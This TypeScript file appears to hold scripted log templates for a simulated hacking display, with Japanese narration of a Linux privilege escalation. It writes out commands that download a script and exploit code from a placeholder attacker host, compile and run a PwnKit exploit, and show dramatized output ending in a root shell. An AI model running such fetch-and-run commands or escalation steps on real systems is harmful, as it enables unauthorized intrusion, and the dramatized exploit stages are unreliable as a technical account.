import { LogTemplate } from "./types";

export const phase4Templates: LogTemplate[] = [
  {
    log: "[INFO] Starting Phase 4: Privilege Escalation...",
    msg: "フェーズ4：権限昇格を開始。\nroot権限（管理者）の奪取を試みます。",
    task: "LPE INITIATION",
  },
  {
    log: "www-data@target-server:/$ id",
    msg: "現在のユーザーIDと所属グループを確認中。",
    task: "ENUMERATION",
  },
  {
    log: "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
    msg: "現在、制限されたWebサーバー権限であることを確認。",
    task: "ENUMERATION",
  },
  {
    log: "www-data@target-server:/$ uname -a",
    msg: "OSのカーネルバージョンを取得中。",
    task: "ENUMERATION",
  },
  {
    log: "Linux target-server 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 x86_64 GNU/Linux",
    msg: "Linuxカーネル 5.10.0を特定。\n既知の脆弱性（LPE）を調査対象にします。",
    task: "ENUMERATION",
  },
  {
    log: "www-data@target-server:/$ wget http://{ATTACKER_IP}/linpeas.py",
    msg: "ローカルサーバーから内部調査用スクリプトをターゲットサーバーへ転送中。",
    task: "SCRIPT TRANSFER",
  },
  {
    log: "[INFO] Download successful. 320KB received.",
    msg: "転送完了。\nスクリプトの完全性を確認しました。",
    task: "SCRIPT TRANSFER",
  },
  {
    log: "www-data@target-server:/$ chmod +x linpeas.py && python3 linpeas.py",
    msg: "実行権限を付与し、自動調査を開始します。",
    task: "LINPEAS RUN",
  },
  {
    log: "{WAIT_SEARCH}",
    msg: "LinPEASによる高度な内部調査中。\n設定ミスやカーネル脆弱性を探索しています。",
    task: "LINPEAS RUN",
  },
  {
    log: "[!] SUID binary found: /usr/bin/pkexec\n[!] Vulnerable to PwnKit (CVE-2021-4034)\n[!] Vulnerable to Dirty Pipe (CVE-2022-0847)",
    msg: "複数の管理者権限奪取ルートを特定。\nPwnKitによるエクスプロイトを選択。",
    task: "VECTOR IDENTIFIED",
  },
  {
    log: "[INFO] Exploiting PwnKit (CVE-2021-4034)...",
    msg: "pkexecのメモリ破損の脆弱性を利用して、管理者シェルを召喚しています。",
    task: "LPE EXECUTION",
  },
  {
    log: "www-data@target-server:/$ wget http://{ATTACKER_IP}/exploit.c",
    msg: "ローカルサーバーから権限昇格用エクスプロイトコードをダウンロード中。",
    task: "EXPLOIT TRANSFER",
  },
  {
    log: "[INFO] Download successful. 4.2KB received.",
    msg: "ダウンロード完了。\nコンパイル準備を開始します。",
    task: "EXPLOIT TRANSFER",
  },
  {
    log: "www-data@target-server:/$ gcc -Wall exploit.c -o exploit",
    msg: "ターゲットサーバー上で、エクスプロイトのネイティブコンパイルを実行しています。",
    task: "LPE BUILD",
  },
  {
    log: "{GCC_OUTPUT}",
    msg: "コンパイル完了。\n警告を確認しましたが、バイナリの生成に成功しました。",
    task: "LPE BUILD",
  },
  {
    log: "www-data@target-server:/$ chmod +x exploit && ./exploit",
    msg: "生成したバイナリに実行権限を付与し、特権昇格エクスプロイトを起動します。",
    task: "LPE EXECUTION",
  },
  {
    log: "[STAGE 1] Validating target SUID binary permissions... OK",
    msg: "攻撃対象となるpkexecの実行権限とSUIDビットの状態を確認中。",
    task: "LPE STAGING",
  },
  {
    log: "[STAGE 2] Searching for usable environment pointers... FOUND (0x7ffe3a21)",
    msg: "メモリ内の環境変数ポインタを探索。\n注入可能なアドレスを特定しました。",
    task: "LPE STAGING",
  },
  {
    log: "[STAGE 3] Injecting GCONV_PATH into envp array... SUCCESS",
    msg: "環境変数配列に偽のGCONV_PATHを注入。\nライブラリの読み込みパスを偽装します。",
    task: "LPE STAGING",
  },
  {
    log: "[STAGE 4] Triggering out-of-bounds write via iconv_open()...",
    msg: "iconv_open関数を呼び出し、意図的な境界外書き込み（OOB）を誘発中。",
    task: "LPE STAGING",
  },
  {
    log: "[STAGE 5] Overwriting effective UID to 0... SUCCESS",
    msg: "プロセスの実効ユーザーIDを0（root）へ強制的に書き換えることに成功しました。",
    task: "LPE STAGING",
  },
  {
    log: '[STAGE 6] Executing execve("/bin/sh", NULL, NULL)...',
    msg: "root権限を保持したまま、特権シェルの起動プロセスを実行します。",
    task: "LPE STAGING",
  },
  {
    log: "[+] Exploit successful. Spawning root shell...",
    msg: "エクスプロイト成功。\nターゲットの管理権限によるBashプロセスの起動を確認。",
    task: "SHELL SPAWNING",
  },
  {
    log: "[+] Switching UID from 33 to 0 (root)",
    msg: "プロセスの権限委譲が完了。\nシステム最高権限へ移行しました。",
    task: "PRIVILEGE GAINED",
  },
  {
    log: "root@target-server:/# id",
    msg: "昇格後の権限を最終確認しています。",
    task: "PRIVILEGE GAINED",
  },
  {
    log: "uid=0(root) gid=0(root) groups=0(root)",
    msg: "最高権限「root」の奪取を確認。\nシステムの完全掌握に成功。",
    task: "PRIVILEGE GAINED",
  },
  {
    log: "root@target-server:/# whoami",
    msg: "カレントユーザー名の確認。",
    task: "PRIVILEGE GAINED",
  },
  {
    log: "root",
    msg: "ターゲットサーバーのrootを掌握。\nこれよりシステムへの介入を開始します。",
    task: "PRIVILEGE GAINED",
  },
  {
    log: "[SUCCESS] Phase 4: Privilege Escalation successful. Full system control granted.",
    msg: "フェーズ4：権限昇格成功。\nこれより機密データの抽出を開始します。",
    task: "MISSION COMPLETE",
  },
];
